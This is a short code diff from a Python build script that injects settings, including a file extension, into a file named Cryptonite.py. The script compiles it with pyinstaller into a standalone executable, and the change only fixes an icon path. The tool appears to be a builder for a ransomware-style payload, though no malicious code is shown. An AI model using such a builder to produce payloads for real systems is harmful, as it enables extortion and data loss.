@@ -43,7 +43,7 @@ def generate():
         text = text.replace("EXT = \"\"", f"EXT = \".{configDict['EXT']}\"")
     with open("Cryptonite.py", "w") as f:
         f.write(text)
-    os.system(f"pyinstaller --onefile --clean --icon=\"\images\icon.ico\" Cryptonite.py --name {FILE}")
+    os.system(f"pyinstaller --onefile --clean --icon=\".\images\icon.ico\" Cryptonite.py --name {FILE}")
     if OS == "nt":
         os.system(f"MOVE /Y \".\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
     else:
